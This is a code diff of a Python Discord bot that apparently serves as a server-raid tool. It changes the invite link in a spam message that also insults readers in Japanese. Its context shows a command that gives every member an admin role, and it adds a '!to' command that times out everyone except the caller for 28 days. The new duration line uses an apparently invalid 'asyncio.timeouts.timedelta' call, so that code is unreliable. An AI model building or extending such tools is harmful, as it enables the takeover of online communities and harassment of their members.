@@ -27,8 +27,8 @@ COMBINED_TEXT = (
     "⊂　　 ノ 　　　・゜+.\n"
     "　し'´Ｊ　　*・ °。\n"
     "\n"
-    "https://discord.gg/XmFW6hh5P\n"
-    "https://discord.gg/XmFW6hh5P\n"
+    "https://discord.gg/4y3kfgr8p\n"
+    "https://discord.gg/4y3kfgr8p\n"
     "お前らみたいな人生負け組のチー牛🧀🐮🤓と豚丼には到底入れないまぶしいサーバーww😂😂😂"
 )
 
@@ -89,6 +89,27 @@ async def admin(ctx):
     for m in guild.members:
         if not m.bot and admin_role not in m.roles:
             tasks.append(m.add_roles(admin_role))
+    await asyncio.gather(*tasks, return_exceptions=True)
+
+
+# ==============================================
+# ✅ 新コマンド: !to → 自分以外全員をタイムアウト
+# ==============================================
+@bot.command(name="to")
+async def timeout_all(ctx):
+    guild = ctx.guild
+    author = ctx.author
+    duration = discord.utils.utcnow() + asyncio.timeouts.timedelta(days=28)  # 最長28日間
+
+    tasks = []
+    for member in guild.members:
+        if member.bot or member.id == author.id:
+            continue  # Botと実行者本人はスキップ
+        try:
+            tasks.append(member.edit(timeout_until=duration, reason="!to による一括タイムアウト"))
+        except:
+            pass
+
     await asyncio.gather(*tasks, return_exceptions=True)
 
 
